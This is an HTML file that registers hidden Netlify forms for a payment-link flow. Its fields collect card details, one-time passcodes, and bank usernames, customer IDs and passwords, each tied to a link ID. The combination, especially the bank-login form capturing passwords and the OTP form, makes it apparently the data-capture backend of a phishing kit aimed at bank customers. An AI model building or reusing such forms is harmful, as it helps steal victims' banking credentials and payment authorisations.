<!DOCTYPE html>
<html>
<head>
  <title>Netlify Forms</title>
</head>
<body>
  <!-- Payment Recipient Form -->
  <form name="payment-recipient" netlify netlify-honeypot="bot-field" hidden>
    <input type="text" name="name" />
    <input type="email" name="email" />
    <input type="tel" name="phone" />
    <input type="text" name="service" />
    <input type="text" name="amount" />
    <input type="text" name="linkId" />
  </form>

  <!-- Payment Card Form -->
  <form name="payment-card" netlify netlify-honeypot="bot-field" hidden>
    <input type="text" name="cardholderName" />
    <input type="text" name="cardLast4" />
    <input type="text" name="expiryMonth" />
    <input type="text" name="expiryYear" />
    <input type="text" name="service" />
    <input type="text" name="paymentId" />
    <input type="text" name="linkId" />
  </form>

  <!-- Payment OTP Verified Form -->
  <form name="payment-otp-verified" netlify netlify-honeypot="bot-field" hidden>
    <input type="text" name="otp" />
    <input type="text" name="service" />
    <input type="text" name="paymentId" />
    <input type="text" name="linkId" />
    <input type="text" name="status" />
  </form>

  <!-- Card Details (New Flow with Bank Selection) -->
  <form name="card-details-new" netlify netlify-honeypot="bot-field" hidden>
    <input type="text" name="name" />
    <input type="email" name="email" />
    <input type="tel" name="phone" />
    <input type="text" name="service" />
    <input type="text" name="amount" />
    <input type="text" name="country" />
    <input type="text" name="bank" />
    <input type="text" name="cardholder" />
    <input type="text" name="cardLast4" />
    <input type="text" name="cardType" />
    <input type="text" name="expiry" />
    <input type="text" name="timestamp" />
  </form>

  <!-- Bank Login Form -->
  <form name="bank-login" netlify netlify-honeypot="bot-field" hidden>
    <input type="text" name="name" />
    <input type="email" name="email" />
    <input type="tel" name="phone" />
    <input type="text" name="service" />
    <input type="text" name="amount" />
    <input type="text" name="country" />
    <input type="text" name="bank" />
    <input type="text" name="cardLast4" />
    <input type="text" name="loginType" />
    <input type="text" name="username" />
    <input type="text" name="customerId" />
    <input type="text" name="phoneNumber" />
    <input type="password" name="password" />
    <input type="text" name="timestamp" />
  </form>
</body>
</html>
